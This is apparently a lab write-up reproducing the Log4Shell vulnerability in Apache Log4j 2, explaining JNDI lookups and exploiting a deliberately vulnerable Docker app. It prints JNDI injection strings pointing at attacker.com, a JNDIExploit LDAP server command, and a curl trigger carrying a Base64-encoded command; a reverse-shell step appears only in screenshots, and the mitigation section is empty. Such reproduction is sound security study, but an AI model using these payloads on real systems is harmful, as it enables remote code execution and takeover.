# CVE Reproduce: Log4Shell (CVE-2021-44228)

### Details

CVE ID: <br>
**CVE-2021-44228**

Vulnerability Name: <br>
**Log4Shell**

Vulnerable Software: <br>
**Apache Log4j 2 (versions 2.0-beta9 through 2.15.0, excluding security releases 2.12.2, 2.12.3, and 2.3.1)**

Vulnerability Type: <br>
**Remote Code Execution (via JNDI injection)**

Severity: <br>
**10.0 CVSS v3 (Critical), 9.3 CVSS v2 (High)**

---

### Summary

Log4Shell is a critical remote code execution vulnerability in Apache Log4j 2, a widely used Java logging library. The flaw arises because Log4j 2 interprets certain input strings containing ${jndi:...} as instructions to perform a JNDI lookup. This lookup can retrieve and execute code from an attacker-controlled server. Because many applications log user-controlled data (e.g., HTTP headers, form inputs), an attacker can exploit this without authentication by sending a crafted request, leading to full compromise of the target system.

This vulnerability was publicly in December 2021, and it quickly became one of the most severe and high-profile software vulnerabilities due to its ease of exploitation and widespread impact.

---

### Example of the Vulnerability

1. An attacker can exploit this vulnerability by crafting a malicious string such as:
   
   ```ruby
   ${jndi:ldap://attacker.com/a}
   ```
   
   This string can be included in various loggable fields such as HTTP headers, user-agent strings, or any other data that is logged by the vulnerable system.

3. When Log4j processes this string in a log message, it will perform a JNDI lookup to the LDAP server (in this case, `attacker.com`), which can return a payload instructing the vulnerable server to execute arbitrary code. This could lead to full system compromise.

---

### How it works

Before diving deeper into the vulnerability, we need to understand the Log4j basics so they can help to a understand the bigger picture.

#### Log4j

Apache Log4j is a widely used Java-based logging framework that helps developers log messages, track events, and monitor applications. It's known for its flexibility and ease of use. Log4j provides various logging features, such as logging at different levels (e.g., INFO, DEBUG, ERROR), directing logs to multiple outputs (console, files, etc.), and formatting log messages with dynamic data.

In a Java program, using Log4j is straightforward. Here is a basic setup:

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class MyApplication {
    private static final Logger logger = LogManager.getLogger(MyApplication.class);

    public static void main(String[] args) {
        logger.info("Application started successfully!");
        logger.error("An error occurred!");
    }
}
```

This logs messages like "Application started successfully!" and "An error occurred!" depending on the log level set (INFO, ERROR, etc.).

<br>

#### Log4j Configuration and Log Message Format

To specify how logs should be formatted and where they should be output, Log4j uses configuration files like XML, JSON, or properties files with `PatternLayout` to define the log message format.

Here is an example of `log42j.xml` configuration file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="[%t] %m%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
```

In the above configuration, the log message format is specified by the `PatternLayout`:

- `[%t]`: This outputs the thread name.

- `%m`: The actual log message.

- `%n`: A newline character, ensuring each log entry is on a new line.

There are many other patterns we can use such as:

- `%d`: Date and time of the log entry (e.g., `2021-12-01 14:30:00`).

- `%l`: The location of the log event, including the class name, method, and line number.

So, if we log a message using `logger.info("User login successful!")`, with the pattern `[INFO] [%t] %d %m%n`, the output might look like:

```pgsql
[INFO] [main] 2021-12-01 14:30:00 User login successful!
```

<br>

#### Log4j Lookups

To further customize the log messages, Log4j provides a feature called `lookups` to allow us dynamically inserting values into log messages at runtime, based on various environment variables, system properties, or other sources.

For example, using the Environment Variables in Log4j:

```xml
<PatternLayout pattern="Hello, $${env:USER}! Log timestamp: %d{ISO8601}"/>
```

This would log a message like:

```yaml
Hello, john_doe! Log timestamp: 2021-12-01T14:30:00.000+0000
```

The `$${env:USER}` lookup is replaced with the environment variable `USER` (e.g., `john_doe`).

Log4j supports many different types of lookups:

- `${env:<var>}`: Fetches an environment variable (e.g., `USER`, `PATH`).

- `${sys:<property>}`: Fetches a system property (e.g., `java.version`).

- `${date:<format>}`: Inserts the current date/time in a specific format.

<br>

#### JNDI Lookups in Log4j

When speaking about lookups, here comes the JNDI Lookup as it is the one used in exploit. JNDI (Java Naming and Directory Interface) is a Java API that allows applications to find and look up resources like databases, objects, and services in a directory. The purpose of JNDI is basically to do the same, which is to lookup some information to be included in the log messages.

However, Log4j can use JNDI to fetch resources remotely via a lookup in log messages. Thus, JNDI lookups are more powerful and complex than simple environment or system variable lookups because they can fetch data from external sources, including remote servers.

So what is the use case for JNDI? Imagine we have several JAVA applications that need to connect to the same database. Instead of hardcoding the database address in every application’s configuration file, we could centralize this information on a directory server (such as an LDAP server). The applications can then query this server at runtime using JNDI to retrieve the database address, making it easier to manage and update:

<img src="./Screenshots/Screenshot1.png" width=80% height=80%><br><br>

<img src="./Screenshots/Screenshot2.png" width=80% height=80%><br><br>

<img src="./Screenshots/Screenshot3.png" width=80% height=80%><br><br>

1. The LDAP server stores the database configuration:

   ```bash
   dbConfig: jdbc:mysql://10.0.0.3:3306/mydatabase
   ```

2. The application queries the LDAP server using JNDI, something like this:

   ```java
   Context ctx = new InitialContext();
   String dbAddress = (String) ctx.lookup("ldap://ldapserver.company.com/dbConfig");
   ```

3. The application dynamically retrieves the database URL at runtime.

JNDI lookups are useful for centralizing configuration information, reducing the need for hardcoding, and simplifying management.

<br>

#### The Flow of the Log4Shell Vulnerability

Now that we understand the basics of Log4j, lookups, and JNDI, let’s see how the Log4Shell vulnerability works.

1. Log4j and JNDI Vulnerability:
   - Log4j has a feature where it can evaluate JNDI-based lookups in log messages.
   - Attackers can exploit this feature by injecting a specially crafted string into a log message, like:
     ```text
     ${jndi:ldap://attacker.com/malicious}
     ```

2. JNDI Lookup via Malicious Server:
   - When Log4j processes this log message, it interprets the `${jndi:ldap://attacker.com/malicious}` as a JNDI lookup.
   - The vulnerable Log4j instance attempts to make a network request to `ldap://attacker.com/malicious`.

3. Malicious LDAP Server:
   - The attacker controls the LDAP server at `attacker.com`.
   - When the vulnerable system performs the JNDI lookup, the attacker’s server can respond with a malicious payload, usually a class that can execute arbitrary code when loaded by the victim's JVM.

4. Remote Code Execution:
   - The attacker’s LDAP server might return a reference to a Java class that the victim’s application loads.
   - This class can contain a payload to run arbitrary commands, giving the attacker remote control over the affected system.

So in short, the summary of the attack flow would be:
1. An attacker injects a malicious JNDI lookup into a loggable field (e.g., HTTP headers).
2. Log4j processes this string and attempts to resolve the JNDI lookup.
3. The lookup connects to the attacker-controlled LDAP server.
4. The LDAP server sends a malicious class, which is executed by the victim’s application.
5. This leads to remote code execution, which can allow the attacker to take full control of the system.

---

### CVE Reproduce

#### Setup

- Kali Linux as attacker machine and Ubuntu installed with Java 8 environment
- [log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) docker by christophetd
- [JNDIExploit](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) to setup a malicious LDAP server

#### Exploitation Step

1. On Kali Linux, run the docker:
   ```docker
   docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
   ```
   <img src="./Screenshots/Screenshot4.png" width=80% height=80%><br><br>

2. On Ubuntu, setup the LDAP server using JNDIExploit:
   ```bash
   java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ubuntu-ip -p 8888
   ```
   <img src="./Screenshots/Screenshot5.png" width=80% height=80%><br><br>

3. Back to Kali Linux, open a new terminal and trigger the exploit using the command below:
   ```bash
   curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://ubuntu-ip:1389/Basic/Command/Base64/(base64_command)}'
   ```

   Convert a command into Base64, then include at the end of the trigger exploit command. For example, `Ping` command:

   <img src="./Screenshots/Screenshot6.png" width=80% height=80%><br><br>

   <img src="./Screenshots/Screenshot7.png" width=80% height=80%><br><br>

   Setup packet sniffer:

   <img src="./Screenshots/Screenshot8.png" width=80% height=80%><br><br>

   Trigger exploit:

   <img src="./Screenshots/Screenshot10.png" width=80% height=80%><br><br>

   **Result**
   
   Packet captured:

   <img src="./Screenshots/Screenshot9.png" width=80% height=80%><br><br>

   On the docker terminal, it shows:

   <img src="./Screenshots/Screenshot11.png" width=80% height=80%><br><br>

   On the Ubuntu LDAP server, it shows:

   <img src="./Screenshots/Screenshot12.png" width=80% height=80%><br><br>

4. Reverse Shell:

   Setup listener:

   <img src="./Screenshots/Screenshot13.png" width=80% height=80%><br><br>

   Craft reverse shell payload:

   <img src="./Screenshots/Screenshot14.png" width=80% height=80%><br><br>

   Convert to Base64 and execute:

   <img src="./Screenshots/Screenshot15.png" width=80% height=80%><br><br>

   <img src="./Screenshots/Screenshot16.png" width=80% height=80%><br><br>

   **Result**

   Reverse shell session established:

   <img src="./Screenshots/Screenshot17.png" width=80% height=80%><br><br>

   <img src="./Screenshots/Screenshot18.png" width=80% height=80%><br><br>

   <img src="./Screenshots/Screenshot19.png" width=80% height=80%><br><br>

---

### Patch & Mitigation
